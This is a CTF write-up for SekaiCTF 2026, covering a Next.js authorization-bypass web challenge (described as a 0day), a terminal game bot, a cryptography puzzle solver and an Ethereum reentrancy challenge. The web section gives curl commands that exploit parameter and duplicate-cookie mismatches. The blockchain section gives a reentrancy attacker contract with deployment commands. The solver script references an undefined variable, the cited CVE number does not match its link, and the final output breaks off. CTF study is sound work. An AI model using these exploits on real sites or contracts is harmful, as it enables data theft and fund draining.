SekaiCTF is an International CTF hosted by [Project Sekai Team](https://sekai.team/) on the [CTFTime Platform](https://ctftime.org/event/3113).

The CTF format is Jeopardy.

Team Hitorinbo Envy 
by helyz

>>> 🏳️ Flag Format:`SEKAI{[\x20-\x7e]+}`

## Web

### [EASY] Migurimental

Author: beluga

Tags: SEKAI, 0day

**Description**

Poor migu lost her leek 🥀🥀

**Note**

*This is a 0day challenge and we are hoping you keep th{is|ese} 0day{|s} to yourself until the vulnerabilit{y|ies} {is|are} patched.*

**Connection**

[https://migurimental.chals.sekai.team](https://migurimental.chals.sekai.team)

[https://migurimental-2.chals.sekai.team](https://migurimental-2.chals.sekai.team)

**Attachments**

1 file, 703 KB total

[web_migurimental.tar.gz 703 KB](https://sekaictf-2026-files.storage.googleapis.com/uploads/b471959d092105ff956474e2ff36e74b928f49fe1ab509464e56fedd2105bbff/web_migurimental.tar.gz)

1. Unzipped the files, found a fake flag >.< 

![](Pasted%20image%2020260706054720.png)

2. Given the page, Migu is crying T_T

![](Pasted%20image%2020260706032836.png)

3. I checked `/robots.txt` and `/backstage`(i think its anything after `/`), found Kanade o_o 

![](Pasted%20image%2020260706033029.png)

4. Went to `/access-card` and `/backroom`, found an interesting reply... Made me feel concerned that this is a Next.js based webpage. So I checked it via. console

![](Pasted%20image%2020260706033133.png)![](Pasted%20image%2020260706050253.png)

Next.js version is **16.2.9**. Close to an exposed **0day** of **[CVE-2026-44574](https://nvd.nist.gov/vuln/detail/CVE-2025-29927)**, the Next.js middleware authorization bypass.

5. Checking Next.js build ID, we get `SS4os-TiYbQ1rBLWNeKcv`. 

![](Pasted%20image%2020260706034320.png)

6. Did a curl to login and gain access card with a cookie for my own, got `/access-card?id=3`

![](Pasted%20image%2020260706034122.png)

7. Checked `cookies.txt`

![](Pasted%20image%2020260706034513.png)
	We get:
		1. `ticket_uuid` = `68289780-5e7c-412e-a475-05b0fb0d334d`
		2. `session` = `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImhlbHl6IiwidGllciI6IlJFR1VMQVIiLCJ0aWNrZXRVdWlkIjoiNjgyODk3ODAtNWU3Yy00MTJlLWE0NzUtMDViMGZiMGQzMzRkIiwic3ViIjoiMyIsImlhdCI6MTc4MzI4MDQyMH0.wHEEFbCExuRyKcpiE9vRUUduaQQ1T9VM2-9uzBYzcbI`

8. Exploiting the parameter mismatch with the given 
	1. `buildID` = `SS4os-TiYbQ1rBLWNeKcv`
	2. `/access-card?id` = `3`
	alongside the cookie session
	 
```bash
curl -b cookies.txt \
  "https://migurimental.chals.sekai.team/_next/data/<buildID>/access-card.json?nxtPid=</access-card?id>&id=1"
```

![](Pasted%20image%2020260706034817.png)

**Full Output:**
```json
{"pageProps":{"user":{"id":1,"username":"miku","tier":"VIP"},"qrDataUrl":"data:image/png;base64,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"},"__N_SSP":true}⏎ 
```

From here, we can see that we got `"tier":"VIP"` as `"username":"miku"` with an `"id":1`. 
This is the core bug, aka. the middleware which gates access that reads one query param, but the page actually reads a diff one. 

ELI5, we can go through a VIP room with our own identity, while using someone else's data :P

9. There's also `qrDataUrl`, in Base64. Since it's a QR-based Base64 confirmed by `data:image/png;base64`, we have to decode it as .png first. Then I used `kitten icat` to view the QR inside the terminal.
   
```bash
echo "<base64 qrDataUrl here>" | base64 -d > qr.png
```

![](Pasted%20image%2020260706041113.png)

After checking the QR from my phone, output was `68694d29-7c80-4e23-8dcd-46d90e344b6c`. That is Migu's cookie.

10. Exploiting the dupe cookie parsing mismatch on `/backroom`, given Migu's `ticket_uuid` cookie &  mine.

```bash
curl "https://migurimental.chals.sekai.team/backroom" \
  -H "Cookie: ticket_uuid=68694d29-7c80-4e23-8dcd-46d90e344b6c; session=<my_session>; ticket_uuid=<my_ticket_uuid>"
```

![](Pasted%20image%2020260706044549.png)

11. From `"backstageNote"`, we get the first part of the flag,

>>> 🏳️ (1/2) Flag Fragment Found: SEKAI{7h3_l33k_15_b4ck_7h3_cr0wd_15_ch33r1ng_4nd_7h3_

12. Since we only got a part of a flag, I relooked to the challenge details, and went to the 2nd link. https://migurimental-2.chals.sekai.team. 

Kanade was there again... and the link changed to `/rejected` right after I entered.

![](Pasted%20image%2020260706045257.png)

13. Finding Next.js Build ID for the 2nd link. Tried the exact same as step 4, but keep getting rejected/error 302, so I approached a different way, with the specified `/rejected` directory

```bash
curl -s https://migurimental-2.chals.sekai.team/rejected | grep -oP 'buildId":"\K[^"]+'
```

![](Pasted%20image%2020260706052541.png)

Build ID = `VlOPiWVknxOpNtTjt6ctd`

14. After that we go visit the prefixed data route with the given Build ID:
    https://migurimental-2.chals.sekai.team/cdn/_next/data/VlOPiWVknxOpNtTjt6ctd/index.json

![](Pasted%20image%2020260706052648.png)

>>> 🏳️ (2/2) Flag Fragment Found: c0nc3r7_c4n_f1n4lly_b3g1n_m1ku_m1ku_b34mmmmmmmmmmmm}

15. FINALLY OMG, NOW I JUST COMBINE THESE. BRICK BY BRICKKK

>> 🏳️ Flag Found & Combined: SEKAI{7h3_l33k_15_b4ck_7h3_cr0wd_15_ch33r1ng_4nd_7h3_c0nc3r7_c4n_f1n4lly_b3g1n_m1ku_m1ku_b34mmmmmmmmmmmm}
## Game

### [EASY] Bejeweled

Author: Eana, sahuang

**Description**

The stage is yours. Clear the board before the final note fades.

**Connection**

`socat -,raw,echo=0 tcp:bejeweled.chals.sekai.team:1337`

1. After connection, a terminal game pops up. Theres a timer, Score, Level, which indicates at Level 1 and a goal of 2500 scores to get to the next level. 
   ![](Pasted%20image%2020260705171746.png)
   
2. It times out after 45 secs after I tried playing it 
   ![](Pasted%20image%2020260705171831.png)

3. Since I suck at ts, imma make a bot that auto solves it for me, i dont think i'll ever get past Level 1 @ 1500 points within 45 secs anyways, let alone a legit person do it... ;-;

```python
import codecs
import re
import socket
import sys
import threading
import time

HOST, PORT = "bejeweled.chals.sekai.team", 1337

ROWS = 12
COLS = 7

GEM_COL0 = 19
GEM_COL_STEP = 6
GEM_ROW0 = 2
GEM_ROW_STEP = 2

TERM_W = 200 
TERM_H = 60

GEMS = set("♢●◼♡♠▲♣")

FLAG_RE = re.compile(r"SEKAI\{[^}\n]+\}")

class Screen:
    def __init__(self):
        self.grid = [[" "] * TERM_W for _ in range(TERM_H)]
        self.row = 1
        self.col = 1
        self.lock = threading.Lock()
        self.decoder = codecs.getincrementaldecoder("utf-8")(errors="replace")

    def feed(self, data: bytes) -> None:
        with self.lock:
            text = self.decoder.decode(data, final=False)
            i = 0
            while i < len(text):
                ch = text[i]
                if ch == "\x1b" and i + 1 < len(text) and text[i + 1] == "[":
                    j = i + 2
                    while j < len(text) and text[j] in "0123456789;?<=>":
                        j += 1
                    if j >= len(text):
                        i += 1
                        continue
                    cmd, params = text[j], text[i + 2 : j]
                    if cmd in ("H", "f"):
                        parts = params.split(";") if params else []
                        self.row = int(parts[0]) if parts and parts[0] else 1
                        self.col = int(parts[1]) if len(parts) > 1 and parts[1] else 1
                    elif cmd == "A":
                        self.row -= int(params) if params else 1
                    elif cmd == "B":
                        self.row += int(params) if params else 1
                    elif cmd == "C":
                        self.col += int(params) if params else 1
                    elif cmd == "D":
                        self.col -= int(params) if params else 1
                    i = j + 1
                elif ch == "\n":
                    self.row += 1
                    self.col = 1
                    i += 1
                elif ch == "\r":
                    self.col = 1
                    i += 1
                else:
                    if 1 <= self.row <= TERM_H and 1 <= self.col <= TERM_W:
                        self.grid[self.row - 1][self.col - 1] = ch
                    self.col += 1
                    i += 1

    def line(self, row: int) -> str:
        with self.lock:
            return "".join(self.grid[row - 1])

    def parse_board(self) -> list[list[str]]:
        with self.lock:
            return [
                [
                    self.grid[GEM_ROW0 + r * GEM_ROW_STEP - 1][
                        GEM_COL0 + c * GEM_COL_STEP - 1
                    ]
                    for c in range(COLS)
                ]
                for r in range(ROWS)
            ]

    def has_selection(self) -> bool:
        with self.lock:
            for r in range(ROWS):
                gy = GEM_ROW0 + r * GEM_ROW_STEP
                for c in range(COLS):
                    if self.grid[gy - 1][16 + c * GEM_COL_STEP] == "[":
                        return True
        return False

    def dump_all(self) -> str:
        with self.lock:
            return "\n".join(
                "".join(self.grid[r]).rstrip() for r in range(TERM_H)
            )

def find_matches(board: list[list[str]]) -> set[tuple[int, int]]:
    matched: set[tuple[int, int]] = set()
    for r in range(ROWS):
        run = 1
        for c in range(1, COLS):
            if board[r][c] == board[r][c - 1] and board[r][c] in GEMS:
                run += 1
            else:
                if run >= 3:
                    matched.update((r, c - 1 - k) for k in range(run))
                run = 1
        if run >= 3:
            matched.update((r, COLS - 1 - k) for k in range(run))
    for c in range(COLS):
        run = 1
        for r in range(1, ROWS):
            if board[r][c] == board[r - 1][c] and board[r][c] in GEMS:
                run += 1
            else:
                if run >= 3:
                    matched.update((r - 1 - k, c) for k in range(run))
                run = 1
        if run >= 3:
            matched.update((ROWS - 1 - k, c) for k in range(run))
    return matched

def best_swap(board):
    best = None
    best_key = -1.0
    for r in range(ROWS):
        for c in range(COLS):
            if board[r][c] not in GEMS:
                continue
            for dr, dc in ((0, 1), (1, 0)):
                r2, c2 = r + dr, c + dc
                if not (0 <= r2 < ROWS and 0 <= c2 < COLS):
                    continue
                if board[r2][c2] not in GEMS:
                    continue
                trial = [row[:] for row in board]
                trial[r][c], trial[r2][c2] = trial[r2][c2], trial[r][c]
                matched = find_matches(trial)
                if not matched:
                    continue
                avg_row = sum(rr for rr, _ in matched) / len(matched)
                key = 100 * len(matched) + avg_row
                if key > best_key:
                    best_key = key
                    best = (r, c, r2, c2, len(matched))
    return best

def board_full(board) -> bool:
    return all(cell in GEMS for row in board for cell in row)

def click(col: int, row: int, btn: int = 0) -> bytes:
    return f"\x1b[<{btn};{col};{row}M\x1b[<{btn};{col};{row}m".encode()

def play(sock: socket.socket, screen: Screen, alive: list[bool]) -> tuple[int, str]:
    deadline = time.time() + 6
    while time.time() < deadline:
        time.sleep(0.15)
        line13 = screen.line(13)
        if "[ Start ]" in line13:
            idx = line13.find("[ Start ]")
            sock.sendall(click(idx + 5, 13))
            break
    else:
        return 0, "menu never rendered"

    deadline = time.time() + 5
    while time.time() < deadline:
        time.sleep(0.1)
        good = sum(1 for row in screen.parse_board() for ch in row if ch in GEMS)
        if good >= ROWS * COLS * 0.95:
            break

    moves = 0
    start = time.time()
    flag = None
    while alive[0] and time.time() - start < 60:
        if "GAME OVER" in screen.line(6) or "Time's up" in screen.line(6):
            break

        board = None
        for _ in range(15):
            time.sleep(0.01)
            candidate = screen.parse_board()
            if board_full(candidate) and not screen.has_selection():
                board = candidate
                break
        if board is None:
            for _ in range(30):
                time.sleep(0.015)
                candidate = screen.parse_board()
                if board_full(candidate) and not screen.has_selection():
                    board = candidate
                    break
        if board is None:
            continue

        swap = best_swap(board)
        if swap is None:
            time.sleep(0.04)
            continue

        r1, c1, r2, c2, _ = swap
        x1 = GEM_COL0 + c1 * GEM_COL_STEP
        y1 = GEM_ROW0 + r1 * GEM_ROW_STEP
        x2 = GEM_COL0 + c2 * GEM_COL_STEP
        y2 = GEM_ROW0 + r2 * GEM_ROW_STEP

        snapshot = [row[:] for row in board]
        try:
            sock.sendall(click(x1, y1) + click(x2, y2))
        except OSError:
            break
        moves += 1

        deadline = time.time() + 0.18
        while time.time() < deadline:
            time.sleep(0.008)
            now = screen.parse_board()
            if board_full(now) and now != snapshot and not screen.has_selection():
                break

    time.sleep(2.0)
    dump = screen.dump_all()
    match = FLAG_RE.search(dump)
    if match:
        flag = match.group(0)
    return moves, flag

def main() -> int:
    sock = socket.create_connection((HOST, PORT), timeout=10)
    screen = Screen()
    alive = [True]

    def reader():
        sock.settimeout(0.05)
        while alive[0]:
            try:
                chunk = sock.recv(65536)
                if not chunk:
                    alive[0] = False
                    return
                screen.feed(chunk)
            except socket.timeout:
                continue
            except OSError:
                alive[0] = False
                return

    threading.Thread(target=reader, daemon=True).start()
    time.sleep(3.0)

    moves, flag = play(sock, screen, alive)
    alive[0] = False
    sock.close()

    final = next(
        (line for line in screen.dump_all().splitlines() if "Final score" in line),
        "(no final-score line)",
    )
    level = next(
        (line for line in screen.dump_all().splitlines() if "Level reached" in line),
        "",
    )
    print(f"moves: {moves}")
    print(final.strip())
    print(level.strip())
    if flag:
        print(f"\nflag: {flag}")
        return 0
    print("\nUGH i failed >.<, run me again and i'll try harder UwU")
    return 1

if __name__ == "__main__":
    sys.exit(main())
```

4. Several minutes later of running the bot script multiple times...
   
![](Pasted%20image%2020260705181528.png)
![](Pasted%20image%2020260705181050.png)

>> 🏳️ Flag Found: SEKAI{th3_l4st_d4nc3_By_eana}

### [NORMAL] 6-7 Puzzle Hunt

Author: Neobeo

Tags: 67

**Description**

Six (or seven?) handcrafted logic puzzles. Best enjoyed with a pencil, not a solver.

**Connection**

https://67-hunt.chals.sekai.team

1. Given a puzzle game webpage 
   ![](Pasted%20image%2020260705193628.png)
   
   Seems that there is multiple puzzle sections, 6 in total:
	- Tapa
	- Nurikabe
	- Fillomino
	- Shikaku
	- Skyscrapers
	- Kakuro

1. Since im dum, I used a solver (*hinted by chall desc.*), called [Noq](https://www.noq.solutions/). 
   ![](Pasted%20image%2020260709184827.png)
   
2. Tapa solution
   ![](Pasted%20image%2020260709185031.png)
   
3. Nurikabe solution
   ![](Pasted%20image%2020260709185225.png)
   
4. Fillomino solution
   ![](Pasted%20image%2020260709185314.png)
   
5. Shikaku solution
   ![](Pasted%20image%2020260709185348.png)

6. Skyscrapers twin towers fr *ehe~*
   ![](Pasted%20image%2020260709185616.png)

7. Kakuro solution
   ![](Pasted%20image%2020260709185642.png)

8. After getting all of the 7-omino blocks, I googled on what it means, I assumed that we have to combine it together somehow... 
   ![](Pasted%20image%2020260709185807.png)

9. After combining the bricks... BRICK BY BRICK!!! 67 *OwO*  
    ![](Pasted%20image%2020260709190114.png)

>> 🏳️ Flag Found: SEKAI{SCRIBBLE_67_LIKE_ITS_A_SEXY_INTEGER}
## Cryptography

### [EASY] oneline6ryp7o

Author: Neobeo

Tags: 67

**Description**

how hard can six seven be
```python
assert __import__('re').match('SEKAI{[67]{67}}$',flag:=input()) and not int.from_bytes(flag.encode())%~(6+~7)**67
```

1. Given a one-liner python code, by understanding the math:
	- The code tries to hide the REAL number with confusing symbols, but if you slowly simplify it step by step, `~(6+~7)**67` just turns into `2^67 - 1`.
	  
	  Here's the real calculations:
	  1. ~7 = -8
	  2. 6 + (-8) = -2
	  3. (-2)**67 = -2^67
	  4. ~(-2^67) = 2^67 - 1

2. After understanding the logic, I created the solver script:

```python
Miku = 2**67 - 1  # the REAL simplified calc.

prefix = b"SEKAI{" 
suffix = b"}"
num = 67

total_len = len(prefix) + num + len(suffix)

# start with 6
base_mod = int.from_bytes(prefix + b'6'*num + suffix, 'big') % Miku

# flipping the binary within 67 bits
target = (-base_mod) % Miku

# figuring out which chars to flip from 6 to 7
exps = [total_len - 1 - (len(prefix) + i) for i in range(n)]
bitpos = [(8*e) % 67 for e in exps]
pos_of_bit = {k: i for i, k in enumerate(bitpos)}

# start with 6, flip chars to 7
chars = ['6'] * n
for k in range(67):
    if (target >> k) & 1:
        chars[pos_of_bit[k]] = '7'

flag = "SEKAI{" + ''.join(chars) + "}"
print(flag)
```

Output:

```bash
SEKAI{6777676667666666677676776776777766777777777776777767777776677666666}
```

>> 🏳️ Flag Found: SEKAI{6777676667666666677676776776777766777777777776777767777776677666666}

## Blockchain

### [EASY] PP Farming

Author: brokenappendix

Tags: Ethereum

**Description**

I found a new way to PP farm, surely nothing could go wrong!

**Note**

First solver gets a $100 bounty :)

**Attachments**

1 file, 740 B total

[blockchain_pp-farming.tar.gz 740 B](https://sekaictf-2026-files.storage.googleapis.com/uploads/a892fe1cf21add141dbf9fecc1f7d0668f6168bdc132f16b9605c5e3ff4d80cd/blockchain_pp-farming.tar.gz)

1. After unzipping the given file, we get 2 files,
	1. `Deploy.s.sol`
	2. `PerformancePointATM.sol`
   
   ![](Pasted%20image%2020260706024153.png)

2. Checked `Deploy.s.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-ctf/CTFDeployer.sol";
import "forge-ctf/CTFChallenge.sol";

import "src/PerformancePointATM.sol";

contract Deploy is CTFDeployer {
    function deploy(address system, address player) internal override returns (CTFChallenge[] memory challenges) {
        vm.startBroadcast(system);

        PerformancePointATM atm = new PerformancePointATM{value: 10 ether}();
        challenges = new CTFChallenge[](1);
        challenges[0] = CTFChallenge("PerformancePointATM", address(atm));

        vm.stopBroadcast();
    }
}
```

3. Then `PerformancePointATM.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PerformancePointATM {
    mapping(address => uint256) public scores;

    constructor() payable {
    }

    function donatePP(address _to) public payable {
        scores[_to] = scores[_to] + msg.value;
    }

    function checkPP(address _who) public view returns (uint256 score) {
        return scores[_who];
    }

    function withdrawPP() public {
        uint256 score = scores[msg.sender];
        require(score > 0, "Nothing to withdraw");
        (bool result, ) = msg.sender.call{value: score}("");
        require(result, "Transfer failed");
        scores[msg.sender] = 0;
    }

    function isSolved() view public returns (bool) {
        return address(this).balance == 0;
    }

    receive() external payable {}
}
```

4. Setting up foundry environment inside the directory

```bash
set PATH ~/.foundry/bin $PATH
```

5. Export the given **Instances** on my bash environment first:
	 1. RPC HTTPS  = `RPC`
	 2. Player Private Key = `PKEY`
	 3. Contract: PerformancePointATM = `ATM`

![](Pasted%20image%2020260705184642.png)

```bash
export RPC="https://eth.chals.sekai.team/rwWBbcQkoFEgNekdMGGEZdhb/main"
export PKEY="b187b0e56f57407e3eb6b7e96074c1b062e9e744e35854f24790bf17068d718e"
export ATM="0xAF190130a683599F006fbaaAB2c431e682158DD8"
```

6. Checked current balance that I have, resulted in `1000 ETH`
   ![](Pasted%20image%2020260705185321.png)

7. Then I reimprovised `PerformancePointATM` to `atk.sol`:
   
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPerformancePointATM {
    function donatePP(address _to) external payable;
    function withdrawPP() external;
}

contract Attacker {
    IPerformancePointATM public atm;
    uint256 public attackScore;
    address public owner;

    constructor(address _atm) {
        atm   = IPerformancePointATM(_atm);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "need ETH");
        attackScore = msg.value;
        atm.donatePP{value: msg.value}(address(this));
        atm.withdrawPP();
    }

    receive() external payable {
        if (address(atm).balance >= attackScore) {
            atm.withdrawPP();
        }
    }

    function withdraw() external {
        require(msg.sender == owner, "only owner");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok);
    }
}
```

8. Ran it with `forge create` on the `atk.sol` script.

```bash
[helyz@kuro-zephy Blockchain_PP_Farming]$ ~/.foundry/bin/forge create atk.sol:Attacker \
	--rpc-url $RPC --private-key $PKEY \
	--constructor-args $ATM
```
   ![](Pasted%20image%2020260705185615.png)
   
   Full Output:

```bash
Contract: Attacker
Transaction: {
  "from": "0x5c2c9e94ec0e8524020ae41a764e7480fa4e7e2e",
  "to": null,
  "maxFeePerGas": "0x77359401",
  "maxPriorityFeePerGas": "0x1",
  "gas": "0x74789",
  "input": "0x608060405234801561000f575f5ffd5b5060405161081338038061081383398181016040528101906100319190610114565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503360025f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061013f565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e3826100ba565b9050919050565b6100f3816100d9565b81146100fd575f5ffd5b50565b5f8151905061010e816100ea565b92915050565b5f60208284031215610129576101286100b6565b5b5f61013684828501610100565b91505092915050565b6106c78061014c5f395ff3fe60806040526004361061004d575f3560e01c80633ccfd60b146101145780638da5cb5b1461012a5780639e5faafc146101545780639e8674dc1461015e578063f6e2bb6e1461018857610110565b36610110576001545f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061010e575f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ed96a9416040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156100f7575f5ffd5b505af1158015610109573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b34801561011f575f5ffd5b506101286101b2565b005b348015610135575f5ffd5b5061013e6102d6565b60405161014b91906104b2565b60405180910390f35b61015c6102fb565b005b348015610169575f5ffd5b50610172610449565b60405161017f9190610526565b60405180910390f35b348015610193575f5ffd5b5061019c61046d565b6040516101a99190610557565b60405180910390f35b60025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610241576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610238906105ca565b60405180910390fd5b5f60025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff164760405161028790610615565b5f6040518083038185875af1925050503d805f81146102c1576040519150601f19603f3d011682016040523d82523d5f602084013e6102c6565b606091505b50509050806102d3575f5ffd5b50565b60025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f341161033d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161033490610673565b60405180910390fd5b346001819055505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663cef4c5d034306040518363ffffffff1660e01b815260040161039e91906104b2565b5f604051808303818588803b1580156103b5575f5ffd5b505af11580156103c7573d5f5f3e3d5ffd5b50505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ed96a9416040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610431575f5ffd5b505af1158015610443573d5f5f3e3d5ffd5b50505050565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015481565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61049c82610473565b9050919050565b6104ac81610492565b82525050565b5f6020820190506104c55f8301846104a3565b92915050565b5f819050919050565b5f6104ee6104e96104e484610473565b6104cb565b610473565b9050919050565b5f6104ff826104d4565b9050919050565b5f610510826104f5565b9050919050565b61052081610506565b82525050565b5f6020820190506105395f830184610517565b92915050565b5f819050919050565b6105518161053f565b82525050565b5f60208201905061056a5f830184610548565b92915050565b5f82825260208201905092915050565b7f6f6e6c79206f776e6572000000000000000000000000000000000000000000005f82015250565b5f6105b4600a83610570565b91506105bf82610580565b602082019050919050565b5f6020820190508181035f8301526105e1816105a8565b9050919050565b5f81905092915050565b50565b5f6106005f836105e8565b915061060b826105f2565b5f82019050919050565b5f61061f826105f5565b9150819050919050565b7f6e656564204554480000000000000000000000000000000000000000000000005f82015250565b5f61065d600883610570565b915061066882610629565b602082019050919050565b5f6020820190508181035f83015261068a81610651565b905091905056fea264697066735822122096d35702e4c7dbb3bba70a12646df01b27a8edbe694a737ec6d0e1bb4937337764736f6c63430008230033000000000000000000000000af190130a683599f006fbaaab2c431e682158dd8",
  "nonce": "0x0",
  "chainId": "0x7a69"
}
ABI: [
  {
    "type": "constructor",
    "inputs": [
      {
        "name": "_atm",
        "type": "address",
        "internalType": "address"
      }
    ],
    "stateMutability": "nonpayable"
  },
  {
    "type": "receive",
    "stateMutability": "payable"
  },
  {
    "type": "function",
    "name": "atm",
    "inputs": [],
    "outputs": [
      {
        "name": "",
        "type": "address",
        "internalType": "contract IPerformancePointATM"
      }
    ],
    "stateMutability": "view"
  },
  {
    "type": "function",
    "name": "attack",
    "inputs": [],
    "outputs": [],
    "stateMutability": "payable"
  },
  {
    "type": "function",
    "name": "attackScore",
    "inputs": [],
    "outputs": [
      {
        "name": "",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "stateMutability": "view"
  },
  {
    "type": "function",
    "name": "owner",
    "inputs": [],
    "outputs": [
      {
        "name": "",
```

9. Since we're given the long ass input of the transaction, I went ahead and `cast send` it with

```bash
[helyz@kuro-zephy Blockchain_PP_Farming]$ ~/.foundry/bin/cast send \
	--rpc-url $RPC --private-key $PKEY \
	--create <the long ass transaction input from the step above, im not pasting ts here...>
```

Full Output:
```bash
blockHash            0x4a755fd68590797725719b68121a149cba2a72e91dc51d18c409bd8b401664da
blockNumber          2
contractAddress      0x37599472946426785050927D4f4c8120C163F0E0
cumulativeGasUsed    477065
effectiveGasPrice    878277710
from                 0x5C2c9e94EC0E8524020ae41a764E7480FA4E7e2E
gasUsed              477065
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                 
status               1 (success)
